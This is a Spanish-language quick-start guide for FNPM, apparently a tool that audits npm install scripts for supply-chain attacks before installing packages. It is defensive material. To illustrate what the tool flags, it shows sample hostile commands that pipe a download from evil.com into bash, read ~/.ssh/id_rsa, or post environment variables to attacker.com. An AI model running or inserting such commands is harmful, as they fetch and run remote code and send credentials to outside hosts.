# 🛡️ FNPM Security - Quick Start Guide

## TL;DR

FNPM ahora **audita automáticamente** todos los paquetes antes de instalarlos para protegerte de ataques como sha1-hulud.

```bash
# La auditoría de seguridad se ejecuta automáticamente
fnpm add express

🔐 Security check for: express
   ✓ SAFE - No install scripts found
   
✅ Security audit passed - proceeding with installation
```

## Uso Básico

### Instalación Normal (CON auditoría)

```bash
fnpm add lodash
# → Audita automáticamente
# → Si es seguro, instala
# → Si es riesgoso, pregunta
```

### Saltar Auditoría (NO recomendado)

```bash
fnpm add trusted-package --no-audit
# → NO audita
# → Instala directamente
```

### Ver Configuración Actual

```bash
cat .fnpm/config.json
```

```json
{
  "package_manager": "npm",
  "security_audit": true    ← Habilitado por defecto
}
```

## ¿Qué Detecta?

### 🔴 Patrones CRÍTICOS
```bash
curl http://evil.com/steal.sh | bash
eval $(cat ~/.ssh/id_rsa)
env | curl -X POST http://attacker.com
```

### 🟡 Patrones SOSPECHOSOS
```bash
curl https://cdn.example.com/assets.tar.gz
process.env.AWS_SECRET_KEY
node scripts/download.js
```

### 🟢 Patrones SEGUROS
```bash
node-pre-gyp install --fallback-to-build
tsc --build
webpack --mode production
```

## Ejemplos de Salida

### Paquete Seguro
```
📦 Package: is-number
🛡️  Risk Level: ✓ SAFE
```

### Paquete con Riesgo Bajo
```
📦 Package: node-sass
🛡️  Risk Level: ⚠ LOW

📜 Install Scripts:
  postinstall: node scripts/build.js

? Continue? (Y/n)
```

### Paquete PELIGROSO
```
📦 Package: malicious-pkg
🛡️  Risk Level: ☠ CRITICAL

📜 Install Scripts:
  postinstall: curl http://evil.com | sh

⚠️  Suspicious Patterns:
  • curl: Downloads files from internet
  • sh: Executes shell commands

⚠️  CRITICAL RISK! Continue? (y/N) ← Default: NO
```

## Configuración

### Deshabilitar para UN Paquete

```bash
# Confías en este paquete específico
fnpm add my-corporate-package --no-audit
```

### Deshabilitar GLOBALMENTE (NO recomendado)

Editar `.fnpm/config.json`:
```json
{
  "package_manager": "npm",
  "security_audit": false  ← Cambia a false
}
```

### Re-habilitar

```json
{
  "package_manager": "npm",
  "security_audit": true
}
```

## Casos Especiales

### Instalaciones Globales
```bash
# Las instalaciones globales NO se auditan
fnpm add -g typescript
# → Se asume que las herramientas globales son confiables
```

### Instalación de Dependencias
```bash
# Solo audita en 'fnpm add', no en 'fnpm install'
fnpm install
# → NO audita (instala desde package.json)
```

## Toma de Decisiones

### ✅ INSTALAR si:
- ✅ Risk Level: SAFE
- ✅ Risk Level: LOW + package popular
- ✅ Risk Level: MEDIUM + revisaste el script
- ✅ Confías en el autor/organización

### ⚠️ INVESTIGAR si:
- ⚠️ Risk Level: MEDIUM
- ⚠️ Risk Level: HIGH
- ⚠️ Patrones de red (curl, wget)
- ⚠️ Paquete desconocido

### 🚫 NO INSTALAR si:
- 🚫 Risk Level: CRITICAL
- 🚫 Acceso a ~/.ssh o ~/.aws
- 🚫 Base64 obfuscation
- 🚫 POST a servidores externos
- 🚫 Paquete muy nuevo (<100 downloads)

## Comandos Útiles

### Ver Paquete en npm
```bash
# Revisar antes de instalar
open "https://www.npmjs.com/package/nombre-paquete"
```

### Ver Código en GitHub
```bash
# Verificar repositorio
npm view nombre-paquete repository.url
```

### Revisar Estadísticas
```bash
# Downloads, versión, etc.
npm info nombre-paquete
```

## Troubleshooting

### "Failed to audit package"

**Causa:** Problemas de red o permisos

**Solución:**
1. El paquete se instala de todas formas (fail-open)
2. Revisa manualmente el package.json del paquete
3. O usa `--no-audit` si confías en el paquete

### Audit muy lento

**Causa:** Red lenta descargando a /tmp

**Solución:**
- La primera vez es lenta, ¡pero te protege!
- Considera usar `--no-audit` para paquetes confiables
- Futuro: Cache de resultados

### Falsos positivos

**Causa:** Paquetes legítimos que compilan código nativo

**Ejemplos:**
- `node-sass` → Compila binarios
- `bcrypt` → Crypto nativo
- `sharp` → Procesamiento de imágenes

**Solución:**
- ✅ Revisa el script
- ✅ Verifica que sea el paquete oficial
- ✅ Acepta el riesgo si confías

## Best Practices

### 1. Siempre revisa los scripts
```bash
# Si aparece un warning, lee el script completo
# No apruebes ciegamente
```

### 2. Verifica la fuente
```bash
# ¿Es el paquete oficial?
# ¿Tiene muchos downloads?
# ¿Está mantenido activamente?
```

### 3. Usa junto con npm audit
```bash
fnpm add express  # → Revisa scripts maliciosos
npm audit         # → Revisa vulnerabilidades conocidas
```

### 4. Reporta paquetes sospechosos
```bash
# Si encuentras algo malicioso
npm report <package-name>
```

### 5. Mantén fnpm actualizado
```bash
fnpm self-update
# → Nuevas detecciones de patrones
```

## Limitaciones

### ✅ Detecta:
- Scripts de instalación maliciosos
- Patrones conocidos de ataques
- Acceso a credenciales
- Network exfiltration

### ❌ NO detecta:
- Código malicioso en runtime
- Vulnerabilidades en dependencias
- Malware que se activa después
- Código ofuscado avanzado

**Recomendación:** Usa múltiples capas:
1. fnpm security (install scripts)
2. npm audit (CVE database)
3. Code review manual (crítico)
4. Herramientas externas (Socket.dev, Snyk)

## FAQ

**Q: ¿Afecta el rendimiento?**
A: Agrega 2-5 segundos por paquete. Es un precio pequeño por seguridad.

**Q: ¿Puedo confiar 100% en la auditoría?**
A: No. Es una capa adicional de seguridad, no una garantía absoluta.

**Q: ¿Funciona offline?**
A: No. Necesita descargar el paquete a /tmp para analizarlo.

**Q: ¿Qué pasa si el audit falla?**
A: Muestra warning pero continúa (fail-open) para no bloquear instalaciones.

**Q: ¿Se guarda algún cache?**
A: Actualmente no. Cada 'add' audita de nuevo. (Próxima feature)

## Recursos

- 📖 [Documentación completa](docs/SECURITY.md)
- 💡 [Ejemplos detallados](docs/SECURITY_EXAMPLES.md)
- 🏗️ [Arquitectura técnica](docs/SECURITY_ARCHITECTURE.md)
- 🔧 [Detalles de implementación](SECURITY_IMPLEMENTATION.md)

## Soporte

Si encuentras un problema o tienes sugerencias:
1. Abre un issue en GitHub
2. Incluye la salida del audit
3. Menciona la versión de fnpm (`fnpm version`)

---

**¡Protégete de ataques en la supply chain! 🛡️**
